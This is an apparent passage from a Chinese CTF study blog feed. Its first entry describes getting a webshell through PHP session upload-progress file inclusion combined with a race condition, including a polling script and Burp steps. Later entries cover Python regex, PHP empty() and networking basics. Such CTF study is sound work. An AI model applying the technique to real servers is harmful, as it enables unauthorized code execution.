id="middle_source">middle_source</h2><p><a href="https://blog.csdn.net/Anton__1/article/details/116891706?utm_medium=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.wap_blog_relevant_pic&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.wap_blog_relevant_pic">csdnwp1</a> <a href="https://blog.csdn.net/m0_51078229/article/details/116845451">csdnwp2</a></p><p>考点：任意文件包含、PHP_SESSION_UPLOAD_PROGRESS➕条件竞争进行文件包含</p><p>利用对文件上传时PHP_SESSION_UPLOAD_PROGRESS自动生成的临时session文件【代码注入】条件竞争实现session里代码的执行</p><p>【<a href="https://xz.aliyun.com/t/9545#toc-8">【5**】先知社区浅谈SESSION_UPLOAD_PROGRESS 的利用+session</a>】</p><h3 id="条件竞争">条件竞争</h3><p><a href="https://blog.csdn.net/qq_36992198/article/details/80007405?utm_source=app&amp;app_version=4.7.1">csdn+ctf小例子</a></p><ol type="1"><li>Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。</li></ol><ul><li>一个简单的例子：将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。</li></ul><ol start="2" type="1"><li>但是，如果我们采用<strong>多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件</strong>，如果这个文件是php的一句话木马，就在服务器中执行，即getshell</li><li>注意⚠️上传的文件被杀软查杀了，是<strong>上传成功才被查杀的</strong>=》考虑利用条件竞争漏洞</li></ol><h4 id="ctf-python脚本不断访问">ctf python脚本不断访问：</h4><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&#x27;你的文件路径&#x27;</span><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    r = requests.<span class="hljs-built_in">get</span>(url)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> in  r.<span class="hljs-built_in">text</span>:        <span class="hljs-built_in">print</span> r.<span class="hljs-built_in">text</span></code></pre><h3 id="session.upload_progress">session.upload_progress</h3><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">【**3】利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p><p><a href="https://cloud.tencent.com/developer/article/1650655">通过条件竞争进行文件上传</a></p><ul><li>前提是我们需要生成一个session文件，并且知道session文件的存放位置</li><li>只要在上传文件的时候，同时POST一个恶意的字段PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用Session，Session文件将会自动创建。</li></ul><ol type="1"><li><strong>利用session.upload_progress后的value【可控】（木马）自动被写入session文件的特性</strong>，然后我们去包含这个session文件。</li><li><strong>session.use_strict_mode默认值为off，此时用户是可以自己定义SessionID的</strong>。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值</li></ol><ul><li>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或/var/lib/php/session</li></ul><ol start="5" type="1"><li>但是<strong>session.upload_progress.cleanup默认是开启的</strong></li></ol><ul><li>意思是一旦读取了所有POST数据，它就会清除进度信息【文件上传结束后session会消失】</li><li>可以通过条件竞争来保持session从而实现文件上传</li></ul><h4 id="总结">总结：</h4><p>其原理大致就是通过 PHP_SESSION_UPLOAD_PROGRESS在目标主机上创建一个含有恶意代码【恶意代码在PHP_SESSION_UPLOAD_PROGRESS的<strong>value里</strong>】的Session文件，之后利用文件包含漏洞去包含这个我们已经传入恶意代码的这个Session文件就可以达到攻击效果。1.上传文件时抓包➕方便认的cookie【这样服务器会生成对应名称的session文件】➕在PHP_SESSION_UPLOAD_PROGRESS下value后<strong>添加一句话木马</strong>2. 然后发送到Intruder请求载荷 Null payloads不断发包，维持session，传入恶意会话。 3.对上述的session文件也不断访问发包 4.这样，一边不断发包以维持恶意session存储，另一边不断发包请求包含恶意的session。<strong>一个POST一个GET</strong>，发现包含利用1上传的文件成功【或者加的一句话/任意命令成功执行】</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式&amp;各类函数</title>
    <link href="/2021/05/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2021/05/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="正则表达式">正则表达式</h3><ul><li><p>由于正则表达式通常包含反斜杠等特殊字符，所以我们最好使用原始字符串来表示他们。如：r’，等价于’\d’，表示匹配一个数字。</p></li><li><p>Python正则表达式中，数量词默认都是贪婪的，它们会尽力尽可能多的去匹配满足的字符，但是如果我们在后面加上问号“?”，就可以屏蔽贪婪模式，表示匹配尽可能少的字符。如字符串：“xyyyyzs”，使用正则“xy*”，就会得到“xyyyy”；如果使用正则“xy*?”，将只会匹配“x”￼</p><p>￼<img src="https://img2018.cnblogs.com/blog/1214695/201810/1214695-20181007133759860-299594689.png" alt="Sss"></p></li></ul><h3 id="re.compile">1、re.compile</h3><ul><li>re.compile(pattern, flags=0)</li><li>a=re.compile(r'hello')将正则表达式编译成对象a(相当于模版，这样不会对每个要使用正则的对象都输入一遍r'hello',而是直接用对象a及其方法来引用：a.search("helloworld!"),<strong>一处编译，多处复用。</strong><ul><li>pattern = re.compile(r'hello') pattern.match('hello world!')以上两句等价于re.match(r”hello”,”hello world!”)</li></ul></li><li>第二个参数flag是匹配模式，取值可以使用按位或运算符==“|”表示同时生效==，比如<strong>re.I| re.M（忽略大小写，换行匹配）。</strong></li><li>re.compile('pattern', re.I | re.M)它等价于：re.compile('(?im)pattern')</li></ul><h3 id="pattern对象下有哪些属性和方法">pattern对象下有哪些属性和方法：</h3><pre><code class="hljs livescript">&gt;&gt;&gt; pattern=re.compile(r<span class="hljs-string">&quot;hello&quot;</span>)&gt;&gt;&gt; dir(pattern)[<span class="hljs-string">&#x27;findall&#x27;</span>, <span class="hljs-string">&#x27;finditer&#x27;</span>, <span class="hljs-string">&#x27;flags&#x27;</span>, <span class="hljs-string">&#x27;groupindex&#x27;</span>, <span class="hljs-string">&#x27;groups&#x27;</span>, <span class="hljs-string">&#x27;match&#x27;</span>, <span class="hljs-string">&#x27;pattern&#x27;</span>, <span class="hljs-string">&#x27;scanner&#x27;</span>, <span class="hljs-string">&#x27;search&#x27;</span>, <span class="hljs-string">&#x27;split&#x27;</span>, <span class="hljs-string">&#x27;sub&#x27;</span>, <span class="hljs-string">&#x27;subn&#x27;</span>]|   表示同时生效re.I 忽略大小写re.L 表示特殊字符集 <span class="hljs-string">\w,</span> <span class="hljs-string">\W,</span> <span class="hljs-string">\b,</span> <span class="hljs-string">\B,</span> <span class="hljs-string">\s,</span> <span class="hljs-string">\S</span> 依赖于当前环境re.M 多行模式re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）re.U 表示特殊字符集 <span class="hljs-string">\w,</span> <span class="hljs-string">\W,</span> <span class="hljs-string">\b,</span> <span class="hljs-string">\B,</span> <span class="hljs-string">\d,</span> <span class="hljs-string">\D,</span> <span class="hljs-string">\s,</span> <span class="hljs-string">\S</span> 依赖于 Unicode 字符属性数据库re.X 为了增加可读性，忽略空格和 <span class="hljs-comment"># 后面的注释</span></code></pre><h3 id="pattern.match">2、pattern.match()</h3><ul><li><strong>group() ——返回匹配结果</strong></li><li>string：被匹配的字符串 pos：匹配的起始位置，可选，默认为0endpos：匹配的结束位置，可选，默认为len(string)</li><li>re.match方法从头开始匹配，<strong>匹配不到就返回None</strong></li><li>pattern.match和re.match的区别是pattern.match可以指定匹配的起始位置，而不用对象直接match无法指定匹配位置，默认匹配全部<pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">import</span> re</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;\w+&quot;</span>)</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">pattern.match(<span class="hljs-string">&quot;qwer123&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>).group()</span>&#x27;qw&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">pattern.match(<span class="hljs-string">&quot;qwer123&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>).group()</span>&#x27;qwe&#x27;</code></pre></li></ul><h4 id="re.match">re.match()</h4><ul><li>该函数的作用是尝试从字符串string的起始位置开始匹配一个模式pattern，如果匹配成功返回一个匹配成功后的Match对象，否则返回None。参数说明： pattern：匹配的正则表达式 string：要匹配的字符串flags：标志位，用于控制正则表达式的匹配方式。如是否区分大小写、是否多行匹配等。例子： <pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>re.match(<span class="hljs-string">r&quot;\w+&quot;</span>,<span class="hljs-string">&quot;avde&quot;</span>).group()<span class="hljs-string">&#x27;avde&#x27;</span></code></pre></li></ul><h4 id="re.match方法与pattern.match方法区别">re.match()方法与pattern.match()方法区别:</h4><p>re.match()不能指定匹配的区间pos和endpos两个参数，pattern.match可以。</p><h3 id="pattern.-search">3、pattern. search()</h3><p>该方法的作用是在string[pos,endpos]区间从pos下标处开始匹配pattern，如果匹配成功，返回匹配成功的Match对象；如果没有匹配成功，则将pos加1后重新尝试匹配，直到pos=endpos时仍无法匹配则返回None。参数说明： string：被匹配的字符串 pos：匹配的起始位置，可选，默认为0endpos：匹配的结束位置，可选，默认为len(string)也就是说如果不指定pos和endpos这两个参数的话，该方法会扫描整个字符串。 -注意，如果string中存在多个pattern子串，只返回第一个</p><p>例子： <pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; pattern=re.compile(<span class="hljs-string">&quot;\d+\w*&quot;</span>)<span class="hljs-meta">&gt;&gt;</span>&gt; pattern.search(<span class="hljs-string">&quot;12abc123ABc123&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>).group()<span class="hljs-string">&#x27;12abc123AB&#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; pattern.search(<span class="hljs-string">&quot;12abc123ABc123&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>).group()<span class="hljs-string">&#x27;12abc123A&#x27;</span></code></pre></p><p><strong>re.search()不能指定匹配的区间pos和endpos两个参数。</strong></p><h3 id="re.match与re.search的区别">re.match与re.search的区别：</h3><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，并返回None；而re.search匹配整个字符串，直到找到一个匹配。 -所以，如果你想要从字符串的<strong>一开始就进行匹配或匹配整个字符串</strong>的话就使用match。它更加快速，否则请使用search。</p><pre><code class="hljs python"><span class="hljs-comment"># example code:</span>string_with_newlines = <span class="hljs-string">&quot;&quot;&quot;something</span><span class="hljs-string">someotherthing&quot;&quot;&quot;</span><span class="hljs-keyword">import</span> re<span class="hljs-built_in">print</span> re.match(<span class="hljs-string">&#x27;some&#x27;</span>, string_with_newlines) <span class="hljs-comment"># matches</span><span class="hljs-built_in">print</span> re.match(<span class="hljs-string">&#x27;someother&#x27;</span>, string_with_newlines) <span class="hljs-comment"># won&#x27;t match </span><span class="hljs-built_in">print</span> re.match(<span class="hljs-string">&#x27;^someother&#x27;</span>, string_with_newlines, re.MULTILINE) <span class="hljs-comment"># also won&#x27;t match</span><span class="hljs-built_in">print</span> re.search(<span class="hljs-string">&#x27;someother&#x27;</span>, string_with_newlines) <span class="hljs-comment"># finds something</span><span class="hljs-built_in">print</span> re.search(<span class="hljs-string">&#x27;^someother&#x27;</span>, string_with_newlines, re.MULTILINE) <span class="hljs-comment"># also finds something,re.MULTILINE 匹配多行模式。</span>m = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;thing$&#x27;</span>, re.MULTILINE)<span class="hljs-built_in">print</span> m.match(string_with_newlines) <span class="hljs-comment"># no match</span><span class="hljs-built_in">print</span> m.match(string_with_newlines, pos=<span class="hljs-number">4</span>) <span class="hljs-comment"># matches</span><span class="hljs-built_in">print</span> m.search(string_with_newlines,re.MULTILINE) <span class="hljs-comment"># also matches</span></code></pre><ol type="1"><li>re.match() 从第一个字符开始找, 如果第一个字符就不匹配就返回None,不继续匹配. 用于判断字符串开头或整个字符串是否匹配,速度快.</li><li>re.search() 会整个字符串查找,直到找到一个匹配。</li><li>re.MULTILINE 匹配多行模式</li></ol><h3 id="findall">4、findall</h3><p>re.findall(pattern, string[, flags])</p><p>返回string中所有与pattern相匹配的全部字串，返回形式为<strong>数组</strong>。### 5、finditer re.finditer(pattern, string[, flags])返回string中所有与pattern相匹配的全部字串，返回形式为迭代器。</p><h3 id="group.-groups的区别">group(). groups()的区别</h3><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">import</span> re</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">s = <span class="hljs-string">&#x27;23432werwre2342werwrew&#x27;</span></span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p = <span class="hljs-string">r&#x27;(\d*)([a-zA-Z]*)&#x27;</span></span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = re.match(p,s)</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group()</span>&#x27;23432werwre&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group(<span class="hljs-number">0</span>)</span>&#x27;23432werwre&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group(<span class="hljs-number">1</span>)</span>&#x27;23432&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group(<span class="hljs-number">2</span>)</span>&#x27;werwre&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.groups()</span>(&#x27;23432&#x27;, &#x27;werwre&#x27;)<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = re.findall(p,s)</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m</span>[(&#x27;23432&#x27;, &#x27;werwre&#x27;), (&#x27;2342&#x27;, &#x27;werwrew&#x27;), (&#x27;&#x27;, &#x27;&#x27;)]<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p=<span class="hljs-string">r&#x27;(\d+)&#x27;</span></span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m=re.match(p,s)</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group()</span>&#x27;23432&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group(<span class="hljs-number">0</span>)</span>&#x27;23432&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.group(<span class="hljs-number">1</span>)</span>&#x27;23432&#x27;<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m.groups()</span>(&#x27;23432&#x27;,)<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m=re.findall(p,s)</span><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m</span>[&#x27;23432&#x27;, &#x27;2342&#x27;]</code></pre><h3 id="正则表达式的1">正则表达式的\1</h3><p>正则表达式中 ‘\1’ 匹配的是 字符 ‘\1’ 。 (因为 ‘’ 匹配字符 ‘’ ) ‘\2’匹配的是 字符 ‘\2’</p><p><strong>正则表达式中的小括号"()"。是代表分组的意思。如果再其后面出现\1则是代表与第一个小括号中要匹配的内容相同。</strong></p><p><em>注意：\1必须与小括号配合使用 </em></p><p>‘\1’ 匹配的是 所获取的第1个()匹配的引用。例如，’(\1’匹配两个连续数字字符。如33aa 中的33 ‘\2’ 匹配的是所获取的第2个()匹配的引用。 例如，’((a)\1’匹配第一是数字第二是字符a,第三\1必须匹配第一个一样的数字重复一次，也就是被引用一次。如9a9被匹配，但9a8不会被匹配，因为第三位的\1必须是9才可以， ‘((a)\2’匹配第一个是一个数字，第二个是a，第三个\2必须是第二组（）中匹配一样的，如，8aa被匹配，但8ab，7a7不会被匹配，第三位必须是第二组字符的复制版，也是就引用第二组正则的匹配内容。</p><h3 id="正则表达式手册">正则表达式手册</h3><p>https://tool.oschina.net/uploads/apidocs/jquery/regexp.html</p><h3 id="empty">empty</h3><p>当 var 存在，并且是一个<strong>非空非零的值时返回 FALSE</strong>否则返回 TRUE。</p><p>==为空/0返回true ！！==</p><p>以下的变量会被认为是空的： <pre><code class="hljs lsl"><span class="hljs-string">&quot;&quot;</span> (空字符串)<span class="hljs-number">0</span> (作为整数的<span class="hljs-number">0</span>)<span class="hljs-number">0.0</span> (作为浮点数的<span class="hljs-number">0</span>)<span class="hljs-string">&quot;0&quot;</span> (作为字符串的<span class="hljs-number">0</span>)NULL<span class="hljs-literal">FALSE</span>array() (一个空数组)$var; (一个声明了，但是没有值的变量)</code></pre></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF学习小记</title>
    <link href="/2020/12/03/CTF%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/12/03/CTF%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>持续更新，业余思考，仅供参考，有时间再改格式</p><h2 id="以太网">以太网</h2><ul><li><p>按照传输技术来分类</p><p><strong>以太网Ethernet 、ATM网、FDDI网可以算作一类</strong></p></li><li><p>按照区域和范围来分类</p><p><strong>互联网 Internet 、广域网WAN、局域网LAN可以算作一类</strong>，<strong>属于OSI参考类型的数据链路层</strong></p></li><li><p><strong>互联网是范围概念；以太网是技术概念</strong></p></li></ul><p>1、简单来说，网络按照区域来划分，分为广域网和局域网。这只是按照使用区域大小来划分的。就像省和村的关系。2、然后在这个小区域（局域网）里建设网络，就需要使用多种标准技术，其中电气标准中规定用双绞线还是单芯线等，这个电气标准中有以太网技术、令牌环网技术、ATM网技术、帧中继技术等，不要被以太网中这个网字迷惑，把它看成技术，我们是用了CSMA/CA技术（别名：以太网技术），使用方便、网络建造简洁，以太网技术就是流传开来。3、局域网中物理网络按照以太网技术敷设完毕，还并不能通信，这个时候就需要其他技术标准，我们经常见到的TCP/IP技术，tcp/ip技术可以依托以太网技术、令牌环网技术等上使用，而且我们经常TCP/IP与以太网配合使用，所以我们日常中口语中容易将TCP/IP与以太网技术混在一起说。其实是不同层级的技术。</p><h2 id="因特网互联网以太网局域网万维网的区别">因特网、互联网、以太网、局域网、万维网的区别</h2><ul><li><p>以太网可以说是局域网的一种，但是目前局域网大多数都是使用以太网标准，故可认为以太网就是局域网。然后，局域网之间的通信协议必须是相同的，即局域网内计算机（或计算机网络）只允许使用同一种通信规则进行通信。而不同的局域网之间，又可以通过其他任意的通信规则进行通信（内部只是用一种通信规则），这就构成了互联网。</p></li><li><p><strong>所以：以太网 &lt;= 局域网 &lt;= 互联网 !=因特网</strong></p><table><colgroup><col style="width: 36%"><col style="width: 63%"></colgroup><thead><tr class="header"><th>网络</th><th style="text-align: center;">作用</th></tr></thead><tbody><tr class="odd"><td>局域网：（Local Area Network，LAN）</td><td style="text-align: center;">局域网是一个局部范围的计算计组，比如家庭网络就是一个小型的局域网，里面包含电脑、手机和平板等，他们共同连接到你家的路由器上。又比如学校的机房就是一个局域网，里面有几百几千台电脑，当机房无法上外网时，但是电脑之间仍可以通信，你们可以通过这个局域网来打CS、玩红警。理论上，局域网是封闭的，并不可以上外网，可以只有两台电脑，也可以有上万台。</td></tr><tr class="even"><td>广域网：（WAN，Wide Area Network）</td><td style="text-align: center;">广域网的范围就比较大了，可以把你家和别人家、各个省、各个国家连接起来相互通信。广域网和局域网都是从范围的角度来划分的，广域网也可以看成是很多个局域网通过路由器等相互连接起来。</td></tr><tr class="odd"><td>以太网：(Ethernet)</td><td style="text-align: center;">以太网可以看成是一种实现局域网通信的<strong>技术标准</strong>，是目前最广泛的<strong>局域网技术</strong>。以太网的运行速率有10Mbps,100Mbps,1Gbps,10Gbps的，它的传输介质有的是双绞线，有的是光纤。简单的说，以太网就是在局域网内，把附近的设备连接起来，可以进行通讯。以太网与<a href="http://baike.baidu.com/view/285040.htm">IEEE802.3</a>系列标准相类似。</td></tr><tr class="even"><td>互联网：（internet）</td><td style="text-align: center;">它的意思是“网络的网络”，是一个通用名词，泛指有多个计算机网络互连而成的网络，这些网络之间的通信协议（即通信规则）是可以任意的，互联网可以看成是局域网、广域网等组成的一个最大的网络，它可以把世界上各个地方的网路都连接起来，个人、政府、学校、企业，只要你能想到的，都包含在内。互联网是一种宽泛的概念，是一个极其庞大的网络。</td></tr><tr class="odd"><td>因特网，（Internet）</td><td style="text-align: center;">记住它与 internet之间绝对不能使用等于号，因为 Internet是一个专有名词，它是指当前全球最大的、开放的、有众多网络互相连接而成的特定的计算机网络，它采用TCP/IP 协议族作为通信的规则，其前身是美国的 ARPNET</td></tr><tr class="even"><td>万维网（WWW）</td><td style="text-align: center;"><strong>它不是一种网络</strong>，它是构建在互联网之上的一个系统/技术，这个系统由很多相互链接的超文本组成</td></tr></tbody></table></li></ul><h3 id="什么是网络">什么是网络？</h3><p>名词解释：计算机网络（network），就是将一台以上的计算机互连起来，互连的计算机之间可以实现通信，实现信息共享，这就是网络。</p><ul><li>互联网（internet），指的是网络的网络，英文小写字母开头，中文采用意译；它可以将多个隔离的网络连接起来，例如公司办公网就是一种互联网，它连接了多个办公楼的网络；</li><li>因特网（Internet）是专有名词，所以英文大写开头，中文采用音译；它是目前最大的互联网，它把全球的网络连接了起来；</li><li>局域网（Local Area Network，LAN）、广域网（Wide AreaNetwork，WAN）和城域网（Metropolitan AreaNetwork，MAN），这几个网络的区别是它们范围不同，中文采用意译；</li><li>以太网（Ethernet）是专有名词，所以英文大写开头，中文采用音译；以太网是局域网的一种，它还有另一个名字：IEEE802.3，它非常厉害打败了历史上的其它局域网技术，是今天的主流；<strong>今天只要你插上网线那一定就是连入了以太网；如果你用手机连了WiFi，WiFi也是一种局域网，WiFi的另一个名字是：IEEE802.11；可以说今天的局域网技术几乎被以太网和WiFi垄断了；</strong></li></ul><p>下面这些是网络：</p><ul><li>互联网、因特网、局域网、广域网、城域网</li></ul><p><strong>下面这些不是网络：</strong></p><ul><li>万维网（WWW），它不是一种网络，它是构建在互联网之上的一个系统，这个系统由很多相互链接的超文本组成</li><li><code>以太网和WiFi，它们是一种局域网技术</code></li></ul><h3 id="网络的分类">网络的分类</h3><p>将网络按照传输介质划分：</p><ul><li>有线网络</li><li>无线网络</li></ul><p>将网络按照覆盖范围划分：</p><ul><li>个域网（PAN:Personal AreaNetwork）覆盖范围大约1米，你的电脑、鼠标、键盘、显示器就组成了一个PAN</li><li>局域网（LAN:Local Area Network）比PAN大</li><li>城域网（MAN:Metropolitan Area Network）比LAN大</li><li>广域网（WAN:Wide Area Network）比MAN大</li></ul><h3 id="网络之间的关系">网络之间的关系</h3><p>这些名词之间的关系：</p><ul><li>因特网是一种具体的互联网</li><li>以太网是一种具体的局域网技术</li><li>WiFi是一种具体的局域网技术</li></ul><h2 id="wifi和wlan的区别是什么">WIFI和WLAN的区别是什么</h2><blockquote><p>https://product.pconline.com.cn/itbk/wlbg/wireless/1305/3303939.html</p><p>https://tw.aboluowang.com/2019/1013/1354979.html</p></blockquote><table><colgroup><col style="width: 36%"><col style="width: 63%"></colgroup><thead><tr class="header"><th>WLAN(Wireless Local Area Networks)</th><th>中文解释为：无线区域网络，它是一种数据传输<em>系统</em>。WLAN是利用射频技术进行数据传输，以此来实现通信和共享资源的网络体系</th></tr></thead><tbody><tr class="odd"><td></td><td><strong>无线局域网的通信范围不受环境的限制，网络的传输范围也很广，最大可达到几十公里。在无线信号覆盖到的任何地方，用户将计算机任意移动，都能连接到网络。对于暂时性的工作小组或家庭组建网络而言，无线局域网是最合适不过的</strong></td></tr><tr class="even"><td>Wi-Fi</td><td>Wi-Fi是由无线访问节点（accesspoint，AP）和无线网卡组成的无线网络。无线访问节点是传统有线局域网络与无线局域网络之间的桥梁，工作原理与一个内置无线发射器的hub（一个多端口的转发器）或者路由等同；无线网卡则是用来接收由无线访问节点发射的信号的设备</td></tr><tr class="odd"><td></td><td>WiFi全称为WirelessFidelity，中文意思是「无线保真」，是一个创建于IEE8.2.11标准的<strong>无线区域网技术</strong>，这种技术改善了基于IEE802.11标准的无线网络产品之间的互通性。在无线区域网的范畴是指「无线相容性认证」，是目前非常流行的一种无线网络技术</td></tr><tr class="even"><td></td><td><strong>WiFI技术与蓝牙技术相似，属于短距离的无线技术</strong></td></tr></tbody></table><ul><li><p>那WLAN与Wi-Fi有什么区别呢？</p><p>虽然很多人会将Wi-Fi与WLAN混为一谈，但实际上Wi-Fi只是WLAN技术的一部分。WLAN包含两个技术协议标准：IEEE802.11标准与HiperLAN标准，而IEEE802.11系列标准由Wi-Fi联盟负责推广，使用IEEE802.11系列协议的局域网就被称为Wi-Fi。但Wi-Fi在无线局域网的范畴是指“无线相容性认证”，实质上是一种商业认证，后来，慢慢被人们用来代指无线联网技术。所以，从包含关系上来说，Wi-Fi包含于WLAN中。</p></li><li><p>简而言之，Wi-Fi技术与蓝牙技术相同，是短距离无线技术。通俗来说，Wi-Fi也是一种无线联网技术，由网线转变为无线电波来连接网络。常见方式是，在一个无线路由器的电波有效覆盖范围内，都可以采用Wi-Fi连接方式进行联网。</p><p>因此，Wi-Fi最大的优势与WLAN相同，在于不用布线，不受布线条件的限制，所以适用于移动办公用户</p><p><code>简单来说，Wlan是无线区域网的总称，Wifi是WLAN中应用最广的一种认证，两者的区别就是WLAN包含了WiFi，而且使用的范围更广。</code></p></li></ul><h2 id="彻底明白ip地址区分localhost127.0.0.1和0.0.0.0">彻底明白ip地址，区分localhost、127.0.0.1和0.0.0.0</h2><p>https://www.jianshu.com/p/ad7cd1d5be45</p><h3 id="localhost">localhost</h3><p><strong>localhost</strong>其实是<code>域名</code>，一般windows系统默认将<strong>localhost</strong>指向<code>127.0.0.1</code>，但是<strong>localhost</strong>并不等于<code>127.0.0.1</code>，<strong>localhost</strong>指向的<strong>IP地址</strong>是可以配置的</p><h3 id="section">127.0.0.1</h3><p>首先我们要先知道一个概念，凡是以<code>127</code>开头的<strong>IP地址</strong>，都是<strong>回环地址（Loopbackaddress）</strong>，其所在的回环接口一般被理解为虚拟网卡，并不是真正的路由器接口。</p><p>所谓的回环地址，通俗的讲，就是我们在主机上发送给<code>127</code>开头的<strong>IP地址</strong>的数据包会被发送的主机自己接收，根本传不出去，外部设备也无法通过回环地址访问到本机。</p><blockquote><p><strong>小说明</strong>：正常的<code>数据包</code>会从<code>IP层</code>进入<code>链路层</code>，然后发送到<code>网络</code>上；而给<code>回环地址</code>发送<code>数据包</code>，<code>数据包</code>会直接被发送主机的<code>IP层</code>获取，后面就没有<code>链路层</code>他们啥事了。</p></blockquote><p>而<code>127.0.0.1</code>作为<code>&#123;127&#125;</code>集合中的一员，当然也是个回环地址。只不过<code>127.0.0.1</code>经常被默认配置为<strong>localhost</strong>的<strong>IP地址</strong>。一般会通过<code>ping 127.0.0.1</code>来测试某台机器上的网络设备是否工作正常。</p><h3 id="section-1">0.0.0.0</h3><p>首先，<code>0.0.0.0</code>是不能被<code>ping</code>通的。在服务器中，<code>0.0.0.0</code>并不是一个真实的的<strong>IP地址</strong>，它表示本机中所有的<strong>IPV4地址</strong>。监听<code>0.0.0.0</code>的端口，就是监听本机中所有<strong>IP</strong>的端口。</p><h3 id="本机ip">本机IP</h3><p><strong>本机IP</strong>通常仅指在同一个局域网内，能同时被外部设备访问和本机访问的那些<strong>IP地址</strong>（可能不止一个）。像<code>127.0.0.1</code>这种一般是不被当作<strong>本机IP</strong>的。<strong>本机IP</strong>是与具体的网络接口绑定的，比如以太网卡、无线网卡或者PPP/PPPoE拨号网络的虚拟网卡，想要正常工作都要绑定一个地址，否则其他设备就不知道如何访问它。</p><h3 id="小例子剧场帮助理解本机ip127.0.0.1和0.0.0.0">小例子剧场（帮助理解本机IP、127.0.0.1和0.0.0.0）</h3><p>现在有两台pc在同一个局域网内，分别为pc1与pc2，pc1上有一个网卡，IP地址为<code>192.168.10.128</code></p><ul><li>pc1中sever监听<code>127.0.0.1</code>，则pc1中的client可以连上<code>127.0.0.1</code>，<code>192.168.10.128</code>连不上；而pc2中client都连不上。</li><li>pc1中sever监听<code>192.168.10.128</code>，则pc1中的client可以连上<code>192.168.10.128</code>，<code>127.0.0.1</code>连不上；而pc2中client能连上<code>192.168.10.128</code>。</li><li>pc1中sever监听<code>0.0.0.0</code>，则pc1中的client可以连上<code>127.0.0.1</code>和<code>192.168.10.128</code>，pc2中的client能连上<code>192.168.10.128</code>。</li></ul><p>Q:</p><p>server监听是啥意思？</p><p>client啥意思？</p><p>网卡，虚拟网卡，</p><p>局域网</p><h2 